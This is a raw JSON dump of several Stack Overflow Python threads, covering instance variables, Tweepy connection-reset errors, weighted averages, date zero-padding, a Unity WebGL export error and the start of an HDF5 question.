"profile_image": "https://www.gravatar.com/avatar/dc22937c056ed41e6d93a015e983ed3a?s=128&d=identicon&r=PG&f=1", "display_name": "Rio mario", "link": "https://stackoverflow.com/users/4723993/rio-mario"}, "edited": false, "score": 0, "creation_date": 1427926701, "post_id": 29401709, "comment_id": 46979185, "body": "does all variables need to be defined in <b>init</b> method?"}], "tags": [], "owner": {"reputation": 1684, "user_id": 4403123, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d3d6cb94cda55242f6537bba6d90e09b?s=128&d=identicon&r=PG&f=1", "display_name": "KSFT", "link": "https://stackoverflow.com/users/4403123/ksft"}, "is_accepted": false, "score": 3, "last_activity_date": 1427926061, "creation_date": 1427926061, "answer_id": 29401709, "question_id": 29401690, "link": "https://stackoverflow.com/questions/29401690/variable-defined-inside-init-not-reading/29401709#29401709", "title": "variable defined inside __init__ not reading", "body": "<p>You called the variables <code>self.i</code> and <code>self.j</code>, not <code>a</code> and <code>b</code>, so that's how you need to refer to them. <code>add()</code> should be defined like this:</p>\n\n<pre><code>def add(self):\n    print self.i+self.j\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 273, "user_id": 4723993, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/dc22937c056ed41e6d93a015e983ed3a?s=128&d=identicon&r=PG&f=1", "display_name": "Rio mario", "link": "https://stackoverflow.com/users/4723993/rio-mario"}, "edited": false, "score": 0, "creation_date": 1427926698, "post_id": 29401726, "comment_id": 46979184, "body": "does all variables need to be defined in <b>init</b> method?"}, {"owner": {"reputation": 62800, "user_id": 391161, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/fb76d8bcc69144a3ee4c893ece7fc588?s=128&d=identicon&r=PG&f=1", "display_name": "merlin2011", "link": "https://stackoverflow.com/users/391161/merlin2011"}, "reply_to_user": {"reputation": 273, "user_id": 4723993, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/dc22937c056ed41e6d93a015e983ed3a?s=128&d=identicon&r=PG&f=1", "display_name": "Rio mario", "link": "https://stackoverflow.com/users/4723993/rio-mario"}, "edited": false, "score": 0, "creation_date": 1427926750, "post_id": 29401726, "comment_id": 46979205, "body": "@Riomario, All the instance variables (variables attached to an object) need to be. Function parameters and class-level variables do not need to be."}, {"owner": {"reputation": 273, "user_id": 4723993, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/dc22937c056ed41e6d93a015e983ed3a?s=128&d=identicon&r=PG&f=1", "display_name": "Rio mario", "link": "https://stackoverflow.com/users/4723993/rio-mario"}, "edited": false, "score": 0, "creation_date": 1427927030, "post_id": 29401726, "comment_id": 46979307, "body": "On: bar = Foo(5, 5) , is bar an object? (5,5) are instance variable and var=9 class-level variable?"}, {"owner": {"reputation": 62800, "user_id": 391161, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/fb76d8bcc69144a3ee4c893ece7fc588?s=128&d=identicon&r=PG&f=1", "display_name": "merlin2011", "link": "https://stackoverflow.com/users/391161/merlin2011"}, "reply_to_user": {"reputation": 273, "user_id": 4723993, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/dc22937c056ed41e6d93a015e983ed3a?s=128&d=identicon&r=PG&f=1", "display_name": "Rio mario", "link": "https://stackoverflow.com/users/4723993/rio-mario"}, "edited": false, "score": 0, "creation_date": 1427927143, "post_id": 29401726, "comment_id": 46979357, "body": "@Riomario, Yes, bar is an object. The instance variables are <code>self.i</code> and <code>self.j</code>. Yes, <code>var</code> is a class-level variable."}, {"owner": {"reputation": 273, "user_id": 4723993, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/dc22937c056ed41e6d93a015e983ed3a?s=128&d=identicon&r=PG&f=1", "display_name": "Rio mario", "link": "https://stackoverflow.com/users/4723993/rio-mario"}, "edited": false, "score": 0, "creation_date": 1427927363, "post_id": 29401726, "comment_id": 46979432, "body": "if self.i and self.j are instance variables then what are a and b?"}, {"owner": {"reputation": 62800, "user_id": 391161, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/fb76d8bcc69144a3ee4c893ece7fc588?s=128&d=identicon&r=PG&f=1", "display_name": "merlin2011", "link": "https://stackoverflow.com/users/391161/merlin2011"}, "reply_to_user": {"reputation": 273, "user_id": 4723993, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/dc22937c056ed41e6d93a015e983ed3a?s=128&d=identicon&r=PG&f=1", "display_name": "Rio mario", "link": "https://stackoverflow.com/users/4723993/rio-mario"}, "edited": false, "score": 0, "creation_date": 1427927388, "post_id": 29401726, "comment_id": 46979444, "body": "@Riomario, Those are parameters of the function, which only live until the function exists."}, {"owner": {"reputation": 273, "user_id": 4723993, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/dc22937c056ed41e6d93a015e983ed3a?s=128&d=identicon&r=PG&f=1", "display_name": "Rio mario", "link": "https://stackoverflow.com/users/4723993/rio-mario"}, "reply_to_user": {"reputation": 62800, "user_id": 391161, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/fb76d8bcc69144a3ee4c893ece7fc588?s=128&d=identicon&r=PG&f=1", "display_name": "merlin2011", "link": "https://stackoverflow.com/users/391161/merlin2011"}, "edited": false, "score": 0, "creation_date": 1427927613, "post_id": 29401726, "comment_id": 46979529, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/74300/discussion-between-rio-mario-and-merlin2011\">continue this discussion in chat</a>."}], "tags": [], "owner": {"reputation": 62800, "user_id": 391161, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/fb76d8bcc69144a3ee4c893ece7fc588?s=128&d=identicon&r=PG&f=1", "display_name": "merlin2011", "link": "https://stackoverflow.com/users/391161/merlin2011"}, "is_accepted": true, "score": 3, "last_activity_date": 1427926151, "creation_date": 1427926151, "answer_id": 29401726, "question_id": 29401690, "link": "https://stackoverflow.com/questions/29401690/variable-defined-inside-init-not-reading/29401726#29401726", "title": "variable defined inside __init__ not reading", "body": "<p>If you want to run the code inside <code>add</code>, you must call it.</p>\n\n<pre><code>bar = Foo(5, 5)  # create object\nbar.add(5,5)\nprint bar.var  # access class variable\n</code></pre>\n"}], "owner": {"reputation": 273, "user_id": 4723993, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/dc22937c056ed41e6d93a015e983ed3a?s=128&d=identicon&r=PG&f=1", "display_name": "Rio mario", "link": "https://stackoverflow.com/users/4723993/rio-mario"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 55, "favorite_count": 0, "accepted_answer_id": 29401726, "answer_count": 2, "score": 0, "last_activity_date": 1427926151, "creation_date": 1427925965, "question_id": 29401690, "link": "https://stackoverflow.com/questions/29401690/variable-defined-inside-init-not-reading", "title": "variable defined inside __init__ not reading", "body": "<p>What I have understood is to define variables inside <strong>init</strong> magic method. I did but the next method is not reading it.</p>\n\n<p>Any help?</p>\n\n<pre><code>class Foo:\n\n    var = 9\n\n    def __init__(self, a, b):\n        self.i = a\n        self.j = b\n\n    def add(self, a, b):\n        print a+b\n\nbar = Foo(5, 5)  # create object\n\nprint bar.var  # access class variable\n</code></pre>\n\n<p>o/p:</p>\n\n<p>9</p>\n\n<p>Why does it not print </p>\n\n<p>10</p>\n\n<p>9</p>\n"}, {"tags": ["python", "error-handling", "tweepy", "rate-limiting"], "answers": [{"comments": [{"owner": {"reputation": 703, "user_id": 3408963, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/8b342b7c02f7fe401c4f4ee65015b70e?s=128&d=identicon&r=PG&f=1", "display_name": "OneManRiot", "link": "https://stackoverflow.com/users/3408963/onemanriot"}, "edited": false, "score": 0, "creation_date": 1427927347, "post_id": 29401877, "comment_id": 46979426, "body": "Your source was the same one I was looking at but I couldn&#39;t make full sense of it. Thank you for putting it in a form I can understand. I&#39;ll try running with this and see what I come up with."}], "tags": [], "owner": {"reputation": 1173, "user_id": 4014693, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "avinash pandey", "link": "https://stackoverflow.com/users/4014693/avinash-pandey"}, "is_accepted": false, "score": 1, "last_activity_date": 1427926828, "creation_date": 1427926828, "answer_id": 29401877, "question_id": 29401640, "link": "https://stackoverflow.com/questions/29401640/working-around-error-104-and-twitter-rate-limiting/29401877#29401877", "title": "Working around error 104 and Twitter rate limiting", "body": "<p>The twitter disconnection error are socket exception,which is a special case of IOError exceptions.In order to catch that you need to do something like </p>\n\n<pre><code>auth = tweepy.OAuthHandler(\u2026 # set up your oauth here\ntry:\n    stream = tweepy.Stream(auth=auth, listener=SomeListener()) # start the stream\nexcept IOError, ex:\n    print 'I just caught the exception: %s' % ex\n</code></pre>\n\n<p>If it works wrap in a while True loop with an increasing backoff so to provide some pause between re-connection.Reference <a href=\"https://groups.google.com/forum/#!topic/tweepy/o0lpL3WRoyg\" rel=\"nofollow\">link</a></p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 4941674, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-Tb0CMlvRGCw/AAAAAAAAAAI/AAAAAAAAAlo/VfWZ3gkhdSA/photo.jpg?sz=128", "display_name": "gios", "link": "https://stackoverflow.com/users/4941674/gios"}, "is_accepted": false, "score": 0, "last_activity_date": 1432665995, "creation_date": 1432665995, "answer_id": 30466495, "question_id": 29401640, "link": "https://stackoverflow.com/questions/29401640/working-around-error-104-and-twitter-rate-limiting/30466495#30466495", "title": "Working around error 104 and Twitter rate limiting", "body": "<p>I've also tried at the same way to wrap Tweepy calls inside a while True loop, but I got also issues with reconnections (in some cases this solution does not permit equally to solve the problem). Otherwise, I've thought to switch Auth (connected to Tweepy API instance, here \"twapi\") in case of error, and it seems to work properly: </p>\n\n<pre><code>...\nwhile True:\n    try:\n        users_stream = twapi.lookup_users(screen_names=[scrname_list_here])\n    except tweepy.error.TweepError, ex:\n        time.sleep(120)\n        global twapi\n        global switch_auth\n        if switch_auth == False:\n            twapi = tweepy.API(auths[auth_id+1])  \n            switch_auth = True\n        elif switch_auth == True:\n            twapi = tweepy.API(auths[auth_id])    \n            switch_auth = False\n        continue\n    break\n ...\n</code></pre>\n\n<p>By using a bool variable <code>switch_auth</code> is possible (in case arises the Tweepy error related to failed reconnection) to \"switch\" the auth input of Tweepy API module (it can be assumed stored in <code>auths</code> list) to solve the problem. \nThe same technique can be used to 'switch' Auth when research's rate limit is reached. I hope it will be useful, just try! </p>\n"}], "owner": {"reputation": 703, "user_id": 3408963, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/8b342b7c02f7fe401c4f4ee65015b70e?s=128&d=identicon&r=PG&f=1", "display_name": "OneManRiot", "link": "https://stackoverflow.com/users/3408963/onemanriot"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1886, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1432665995, "creation_date": 1427925771, "question_id": 29401640, "link": "https://stackoverflow.com/questions/29401640/working-around-error-104-and-twitter-rate-limiting", "title": "Working around error 104 and Twitter rate limiting", "body": "<p>I'm working on a research project that involves analyzing large amounts of data from Twitter. The project is being built in Python using Tweepy. As you might imagine I have to work very closely within the confines of the Twitter rate limiter. As such, my authentication code looks like this.</p>\n\n<pre><code>auth1 = tweepy.OAuthHandler(\"...\", \"...\")\nauth1.set_access_token(\"...\", \"...\")\napi1 = tweepy.API(auth1, wait_on_rate_limit=True, wait_on_rate_limit_notify=True)  \n</code></pre>\n\n<p>Which does a wonderful job of stopping and waiting before I trip my limit on requests for a small scaled down run. However, when I try and run the program on my full data set I eventually get this error while the program is sleeping:</p>\n\n<pre><code>tweepy.error.TweepError: Failed to send request: ('Connection aborted.', error(104, 'Connection reset by peer'))\n</code></pre>\n\n<p>My research tells me that this is happening because Twitter is disconnecting and I need to catch the error. How would I catch this error, reconnect and have my program pick up where it left off? Any advice would be welcome.</p>\n"}, {"tags": ["python", "formula"], "comments": [{"owner": {"reputation": 45, "user_id": 4701787, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/de82b7eb110f909a58b796ea9310dbf5?s=128&d=identicon&r=PG&f=1", "display_name": "Spencer Josephs", "link": "https://stackoverflow.com/users/4701787/spencer-josephs"}, "edited": false, "score": 0, "creation_date": 1427925679, "post_id": 29401604, "comment_id": 46978812, "body": "Every thing works, I just don&#39;t know how to compute this formula"}], "answers": [{"comments": [{"owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "edited": false, "score": 0, "creation_date": 1427925924, "post_id": 29401644, "comment_id": 46978901, "body": "Doesn&#39;t that just <code>print</code> a <code>generator</code> object?"}, {"owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "edited": false, "score": 1, "creation_date": 1427926815, "post_id": 29401644, "comment_id": 46979235, "body": "And now add a <code>)</code> to close the <code>print</code> call, and a <code>&quot;</code> to end the string <code>&quot;weightedavg.txt</code>. :)"}], "tags": [], "owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "is_accepted": false, "score": 3, "last_activity_date": 1427928521, "last_edit_date": 1427928521, "creation_date": 1427925792, "answer_id": 29401644, "question_id": 29401604, "link": "https://stackoverflow.com/questions/29401604/taking-weighted-avg-with-specific-formula/29401644#29401644", "title": "Taking weighted avg with specific formula", "body": "<p>You can zip the two lists together, multiply each corresponding element and  sum:</p>\n\n<pre><code>print(sum(a*b for a,b in zip(weights, grades)))\n</code></pre>\n\n<p>This presumes both lists are the same length but I imagine they are or your logic is wrong.</p>\n\n<p>I am not sure I follow all your code as you seem to loop but not store grades or  weights outside the loop so I presume you want to do this for each line:</p>\n\n<pre><code>infileName=\"grades.txt\"\noutfileName=\"weightedavg.txt\"\n\nwith open(infileName) as infile, open(outfileName,\"w\") as outfile:\n    for line in infile:\n        test = line.split()\n        grades = map(int,test[3::2])\n        weights =  map(int,test[2::2])  \n        wghtd_avg = sum(a*b for a,b in zip(weights,grades))\n</code></pre>\n\n<p>If you don't need grades or weights other than to do the calculations you can use <code>map</code> with <code>itertools.islice</code>:</p>\n\n<pre><code>from itertools import islice\n\nwith open(infileName) as infile, open(outfileName,\"w\") as outfile:\n    for line in infile:\n        test = line.split()\n        it = map(int, islice(test, 2, None)) # itertools.imap for python2\n        print(sum(a*b for a,b in zip(it, it)))\n</code></pre>\n\n<p>Using <code>with</code> will automatically close your files, use <code>itertools.imap</code> and <code>itertools.izip</code>  if you are using python2.</p>\n"}, {"tags": [], "owner": {"reputation": 17238, "user_id": 240490, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/536433ff8bf7f50dcab75a920a11d30a?s=128&d=identicon&r=PG", "display_name": "Jonathan Eunice", "link": "https://stackoverflow.com/users/240490/jonathan-eunice"}, "is_accepted": true, "score": 1, "last_activity_date": 1427926594, "last_edit_date": 1427926594, "creation_date": 1427925926, "answer_id": 29401678, "question_id": 29401604, "link": "https://stackoverflow.com/questions/29401604/taking-weighted-avg-with-specific-formula/29401678#29401678", "title": "Taking weighted avg with specific formula", "body": "<p>A generator expression (which you can think of an an implied list comprehension) is probably the most \"Pythonic\" solution:</p>\n\n<pre><code>grades = [83, 92, 96]\nweights = [0.4, 0.4, 0.2]\nweighted_avg = sum(x * y for x,y in zip(grades, weights))\n</code></pre>\n\n<p>At the end, <code>weighted_avg == 89.2</code></p>\n"}], "owner": {"reputation": 45, "user_id": 4701787, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/de82b7eb110f909a58b796ea9310dbf5?s=128&d=identicon&r=PG&f=1", "display_name": "Spencer Josephs", "link": "https://stackoverflow.com/users/4701787/spencer-josephs"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 52, "favorite_count": 0, "accepted_answer_id": 29401678, "answer_count": 2, "score": 1, "last_activity_date": 1427928521, "creation_date": 1427925613, "last_edit_date": 1427925948, "question_id": 29401604, "link": "https://stackoverflow.com/questions/29401604/taking-weighted-avg-with-specific-formula", "title": "Taking weighted avg with specific formula", "body": "<pre><code>infileName=\"grades.txt\"\ninfile=open(infileName,\"r\")\noutfileName=\"weightedavg.txt\"\noutfile=open(outfileName,\"w\")\nfor line in infile:\n    test=line.strip()\n    test=line.split()\n    fname=test[0]\n    lname=test[1]\n    grades=test[3::2]\n    weights=test[2::2]\n   grades=[int(i) for i in grades]\n   weights=[int(i) for i in grades]\n   weightedavg=????\n</code></pre>\n\n<blockquote>\n  <p>The formula for the weighted average is (weight1*grade1)+(weight2*grade2)...+    (weightn+graden)</p>\n</blockquote>\n"}, {"tags": ["python", "datetime"], "answers": [{"tags": [], "owner": {"reputation": 15161, "user_id": 4338920, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/AHhiC.png?s=128&g=1", "display_name": "Malik Brahimi", "link": "https://stackoverflow.com/users/4338920/malik-brahimi"}, "is_accepted": false, "score": 1, "last_activity_date": 1427926657, "creation_date": 1427926657, "answer_id": 29401839, "question_id": 29401553, "link": "https://stackoverflow.com/questions/29401553/formatting-date-with-leading-zeros-for-month-and-day-and-removing-slashes/29401839#29401839", "title": "Formatting date with leading zeros for month and day and removing slashes", "body": "<p>Split and then fill and join:</p>\n\n<pre><code>newDate = ''.join(i.zfill(2) for i in oldDate.split('/'))\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 15161, "user_id": 4338920, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/AHhiC.png?s=128&g=1", "display_name": "Malik Brahimi", "link": "https://stackoverflow.com/users/4338920/malik-brahimi"}, "edited": false, "score": 0, "creation_date": 1427926756, "post_id": 29401851, "comment_id": 46979207, "body": "That&#39;s exactly what I did."}, {"owner": {"reputation": 2145, "user_id": 2403000, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/2303300fa4b29197c3a11eea331afdbf?s=128&d=identicon&r=PG", "display_name": "Peter", "link": "https://stackoverflow.com/users/2403000/peter"}, "reply_to_user": {"reputation": 15161, "user_id": 4338920, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/AHhiC.png?s=128&g=1", "display_name": "Malik Brahimi", "link": "https://stackoverflow.com/users/4338920/malik-brahimi"}, "edited": false, "score": 0, "creation_date": 1427926888, "post_id": 29401851, "comment_id": 46979261, "body": "Yeah looks like it haha, I was in the middle of writing though so didn&#39;t see yours ;p"}, {"owner": {"reputation": 9, "user_id": 4739398, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/26d98590f2f98c3eca4a3673f3cea5e2?s=128&d=identicon&r=PG&f=1", "display_name": "Amy Newton", "link": "https://stackoverflow.com/users/4739398/amy-newton"}, "edited": false, "score": 0, "creation_date": 1428020839, "post_id": 29401851, "comment_id": 47020491, "body": "Would this work if I get dates like 12/1/1996 and 12/12/1996 as well?  Would this know that the months and days should always be 2 digits?"}, {"owner": {"reputation": 2145, "user_id": 2403000, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/2303300fa4b29197c3a11eea331afdbf?s=128&d=identicon&r=PG", "display_name": "Peter", "link": "https://stackoverflow.com/users/2403000/peter"}, "edited": false, "score": 0, "creation_date": 1428023612, "post_id": 29401851, "comment_id": 47021081, "body": "Yeah, the number given in <code>zfill</code> means it&#39;ll only add zeros until the string hits that length, which in this case is 2 :)"}, {"owner": {"reputation": 9, "user_id": 4739398, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/26d98590f2f98c3eca4a3673f3cea5e2?s=128&d=identicon&r=PG&f=1", "display_name": "Amy Newton", "link": "https://stackoverflow.com/users/4739398/amy-newton"}, "edited": false, "score": 0, "creation_date": 1428361619, "post_id": 29401851, "comment_id": 47122813, "body": "We are using python 2.5 and we get errors when using this code.  Do you know a different code for version 2.5 to accomplish this?"}, {"owner": {"reputation": 2145, "user_id": 2403000, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/2303300fa4b29197c3a11eea331afdbf?s=128&d=identicon&r=PG", "display_name": "Peter", "link": "https://stackoverflow.com/users/2403000/peter"}, "edited": false, "score": 0, "creation_date": 1428375644, "post_id": 29401851, "comment_id": 47126368, "body": "Nope, but I can take a guess it&#39;s probably zfill, I did a bit at the bottom without it, although you should ideally be doing it yourself haha."}], "tags": [], "owner": {"reputation": 2145, "user_id": 2403000, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/2303300fa4b29197c3a11eea331afdbf?s=128&d=identicon&r=PG", "display_name": "Peter", "link": "https://stackoverflow.com/users/2403000/peter"}, "is_accepted": false, "score": 0, "last_activity_date": 1428375576, "last_edit_date": 1428375576, "creation_date": 1427926714, "answer_id": 29401851, "question_id": 29401553, "link": "https://stackoverflow.com/questions/29401553/formatting-date-with-leading-zeros-for-month-and-day-and-removing-slashes/29401851#29401851", "title": "Formatting date with leading zeros for month and day and removing slashes", "body": "<p>Instead of stripping out the slashes, split it by them. You'll have 3 different numbers in a list, relating to day, month, and year, so go through each of them, and if the length is 1, add a zero to the start. Finally join these together and you have your number.</p>\n\n<p>There's also another quick way to add leading zeroes. Using <code>str().zfill( num )</code> will pad out the string with zeroes until it's a certain number of characters.</p>\n\n<p>Since you should be able to write it yourself following the first paragraph, I'll put in a one line version so you can see that it works, but not copy it since it'll be obvious you didn't write it.</p>\n\n<pre><code>i = \"3/9/2015\"\n\nprint ''.join(x.zfill(2) for x in i.split('/'))\n# 03092015\n</code></pre>\n\n<p>This is a way without zfill:</p>\n\n<pre><code>print ''.join(('0' if len(x)&lt;2 else '')+x for x in i.split('/'))\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 15161, "user_id": 4338920, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/AHhiC.png?s=128&g=1", "display_name": "Malik Brahimi", "link": "https://stackoverflow.com/users/4338920/malik-brahimi"}, "edited": false, "score": 0, "creation_date": 1427926986, "post_id": 29401918, "comment_id": 46979290, "body": "That&#39;s such a primitive technique."}, {"owner": {"reputation": 1671, "user_id": 4669462, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/03fub.jpg?s=128&g=1", "display_name": "logic", "link": "https://stackoverflow.com/users/4669462/logic"}, "reply_to_user": {"reputation": 15161, "user_id": 4338920, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/AHhiC.png?s=128&g=1", "display_name": "Malik Brahimi", "link": "https://stackoverflow.com/users/4338920/malik-brahimi"}, "edited": false, "score": 0, "creation_date": 1427927046, "post_id": 29401918, "comment_id": 46979311, "body": "@MalikBrahimi I know, but I didn&#39;t wanna get reprimanded for copying you ;)"}, {"owner": {"reputation": 2145, "user_id": 2403000, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/2303300fa4b29197c3a11eea331afdbf?s=128&d=identicon&r=PG", "display_name": "Peter", "link": "https://stackoverflow.com/users/2403000/peter"}, "edited": false, "score": 0, "creation_date": 1427927119, "post_id": 29401918, "comment_id": 46979340, "body": "Depends if it&#39;s only that date or if it could be any haha, won&#39;t work so well with something like 15/6/2015 :)"}], "tags": [], "owner": {"reputation": 1671, "user_id": 4669462, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/03fub.jpg?s=128&g=1", "display_name": "logic", "link": "https://stackoverflow.com/users/4669462/logic"}, "is_accepted": false, "score": 0, "last_activity_date": 1427927735, "last_edit_date": 1427927735, "creation_date": 1427926963, "answer_id": 29401918, "question_id": 29401553, "link": "https://stackoverflow.com/questions/29401553/formatting-date-with-leading-zeros-for-month-and-day-and-removing-slashes/29401918#29401918", "title": "Formatting date with leading zeros for month and day and removing slashes", "body": "<p>If you don't want to use for-loops or anything too fancy just do something simple like this:</p>\n\n<pre><code>date = '392015'\n\nnewdate = '0' + date[0] + '0' + date[1:]\n</code></pre>\n\n<p>This will output:</p>\n\n<pre><code>03092015\n</code></pre>\n\n<p>Literally, all this is doing is 'adding' zeros.</p>\n\n<p><strong>Update</strong>: For this <em>primitive</em> technique to work on all dates, just use two <em>primitive</em> 'if-statements' ;)</p>\n\n<pre><code>date = '3/9/2015'\noldDate = date.split('/')\n\nif len(oldDate[0]) &lt; 2:\n    oldDate[0]= '0' + oldDate[0]\nif len(oldDate[1]) &lt; 2:\n    oldDate[1]= '0' + oldDate[1]\n\nnewDate = ''.join(oldDate)\n</code></pre>\n\n<p>(Note: I'm just giving the OP OPtions, by no means am I claiming this is a superior method)</p>\n"}], "owner": {"reputation": 9, "user_id": 4739398, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/26d98590f2f98c3eca4a3673f3cea5e2?s=128&d=identicon&r=PG&f=1", "display_name": "Amy Newton", "link": "https://stackoverflow.com/users/4739398/amy-newton"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2071, "favorite_count": 0, "answer_count": 3, "score": -5, "last_activity_date": 1587935325, "creation_date": 1427925392, "last_edit_date": 1587935325, "question_id": 29401553, "link": "https://stackoverflow.com/questions/29401553/formatting-date-with-leading-zeros-for-month-and-day-and-removing-slashes", "title": "Formatting date with leading zeros for month and day and removing slashes", "body": "<p>The incoming date looking like this:</p>\n\n<pre><code>3/9/2015\n</code></pre>\n\n<p>I have figured out how to strip the <code>/</code> marks out of the date so I now have this:</p>\n\n<pre><code>392015\n</code></pre>\n\n<p>Now, I need to have the leading zeros in the month and day, so the desired output is</p>\n\n<pre><code>03092015\n</code></pre>\n"}, {"tags": ["python", "html", "unity3d"], "owner": {"reputation": 19, "user_id": 3713134, "user_type": "registered", "accept_rate": 7, "profile_image": "https://graph.facebook.com/1275205806/picture?type=large", "display_name": "user3713134", "link": "https://stackoverflow.com/users/3713134/user3713134"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 509, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1428006640, "creation_date": 1427925097, "last_edit_date": 1428006640, "question_id": 29401488, "link": "https://stackoverflow.com/questions/29401488/unity-project-error-during-export-to-html5", "title": "unity project error during export to html5", "body": "<p>When i create a blank project on unity 5 and i try to export it to html5, the following message error appears:\nFailed running \"C:\\Program Files\\Unity\\Editor\\Data\\PlaybackEngines\\webglsupport/BuildTools/Emscripten_Win/python/2.7.5.3_64bit/python.exe\" \"C:\\Program Files\\Unity\\Editor\\Data\\PlaybackEngines\\webglsupport/BuildTools/Emscripten/emcc\" @\"C:/projetos unity/new project/New Unity Project 1/Assets/../Temp/emcc_arguments.resp\"</p>\n\n<p>stdout:\nstderr:\nC:\\Program Files\\Unity\\Editor\\Data\\PlaybackEngines\\webglsupport/BuildTools/Emscripten_FastComp_Win\\llvm-link: C:/Users/f\ufffdbioandrews/AppData/Local/Unity/Editor/EmscriptenCache/libcxx.bc: error: Could not open input file: N\ufffdo existe mapeamento para o caractere Unicode na p\ufffdgina de c\ufffddigos de m\ufffdltiplos bytes de destino\nC:\\Program Files\\Unity\\Editor\\Data\\PlaybackEngines\\webglsupport/BuildTools/Emscripten_FastComp_Win\\llvm-link: error loading file 'C:\\Users\\f\ufffdbioandrews\\AppData\\Local\\Unity\\Editor\\EmscriptenCache\\libcxx.bc'\nTraceback (most recent call last):\n  File \"C:\\Program Files\\Unity\\Editor\\Data\\PlaybackEngines\\webglsupport/BuildTools/Emscripten/emcc\", line 1166, in \n    shared.Building.link(linker_inputs, in_temp(target_basename + '.bc'), force_archive_contents=len([temp for i, temp in temp_files if not temp.endswith(STATICLIB_ENDINGS)]) == 0)\n  File \"C:\\Program Files\\Unity\\Editor\\Data\\PlaybackEngines\\webglsupport\\BuildTools\\Emscripten\\tools\\shared.py\", line 1330, in link\n    assert os.path.exists(target) and (output is None or 'Could not open input file' not in output), 'Linking error: ' + output\nAssertionError: Linking error: </p>\n\n<p>UnityEditor.HostView:OnGUI()</p>\n\n<p>What can i do to solve this error? Is there a way to change the EmscriptenCache folder location? I think the error is my user name folder that has a Unicode character: f\u00e1bioandrews</p>\n"}, {"tags": ["python", "pandas", "time-series", "hdfs", "pytables"], "answers": [{"tags": [], "owner": {"reputation": 141, "user_id": 2731801, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/0d4688d0aa476279f88f6a623878e910?s=128&d=identicon&r=PG&f=1", "display_name": "Pavel", "link": "https://stackoverflow.com/users/2731801/pavel"}, "is_accepted": false, "score": 1, "last_activity_date": 1428191045, "creation_date": 1428191045, "answer_id": 29452624, "question_id": 29401457, "link": "https://stackoverflow.com/questions/29401457/appending-time-series-to-existing-hdf5-file-with-tstables/29452624#29452624", "title": "Appending time series to existing HDF5-file with tstables", "body": "<p>Found the function for that in <a href=\"https://github.com/afiedler/tstables/blob/master/src/tstables/group.py\" 